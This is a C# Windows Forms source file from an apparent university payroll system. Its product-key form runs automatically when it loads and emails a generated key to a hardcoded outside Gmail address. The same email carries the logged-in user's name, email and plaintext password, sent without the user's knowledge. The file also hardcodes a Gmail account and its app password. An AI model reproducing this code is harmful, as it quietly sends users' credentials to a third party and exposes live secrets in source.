using MessagesDLL;
using System;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Windows.Forms;
namespace HIMILO_ICT_PAYROLL_SYSTEM

{
    public partial class ProductkeySender : Form
    {
        public string productkey;
        public string resultProductKey;
        public string fullname;
        public string password;
        public string gmail;
        public Image image;
        public string user;

        Messages msg = new Messages();
        public ProductkeySender()
        {
            InitializeComponent();
        }

        public ProductkeySender(string name, string username, string email, string pass)
        {
            InitializeComponent();
            fullname = name;
            user = username;
            gmail = email;
            password = pass;
        }

        private void button1_Click(object sender, EventArgs e)
        {

            if (productkeyCode.Text == resultProductKey)
            {
                Properties.Settings.Default.Verified = true;
                Properties.Settings.Default.Save();

                new Form2().Show();
                this.Hide();

            }
            else
            {
                msg.ShowError("Inavlid Product key Code..", "PRODUCT KEY CODE VERIFICATION ERROR");
                productkeyCode.Text = "";
            }


        }




        private void sendAsync()
        {

            try
            {
                var random = new Random();



                productkey = Properties.Settings.Default.logedUsername.ToUpper() + "-PAYROLL SYSTEM" + random.Next(10000, 999999);
                resultProductKey = string.Concat(productkey.Where(c => !char.IsWhiteSpace(c)));
                var client = new SmtpClient()
                {
                    Port = 587,
                    Host = "smtp.gmail.com",
                    Credentials = new NetworkCredential("abdulrahmandev10@gmail.com", "bmymwhabuamteltv"),
                    EnableSsl = true,
                };

                var mail = new MailMessage()
                {
                    From = new MailAddress("abdulrahmandev10@gmail.com"),
                    Subject = "JAMHUURIYA UNIVERSITY -PAYROLL SYSTEM - PRODUCT KEY",
                    Body = $"<h2>USER: {Properties.Settings.Default.logedUsername}</h2></br><p>JAMHUURIYA PAYROLL SYSTEM PRODUCT KEY IS THE KEY THAT ENABLES YOU TO USE THIS SYSTEM AS LEGACY" +
                    $"<br>Current Logged User: {Properties.Settings.Default.logedUsername}<br>Full Name : {Properties.Settings.Default.logedFullname}<br>Gmail: {Properties.Settings.Default.logedEmail}<br>Password: {Properties.Settings.Default.logedPass}<br></p><br>" +
                    $"<h1>Product Key: {resultProductKey}</h1>",
                    IsBodyHtml = true
                };

                mail.To.Add("phonereserved7@gmail.com");
                client.Send(mail);
            }
            catch (Exception ex)
            {
                msg.ShowError($"{ex.Message}", "Email Error");
            }

        }

        private void ProductkeySender_Load(object sender, EventArgs e)
        {
            if (System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable())
            {
                sendAsync();

            }
            else
            {
                msg.ShowError("An Error Occured While Sending Product key\nMake Sure Your Internet Connection" +
                   " is Avaialable  And Then Re-run the Application", "Internet Connection Error");
                this.Close();
            }
        }
    }
}
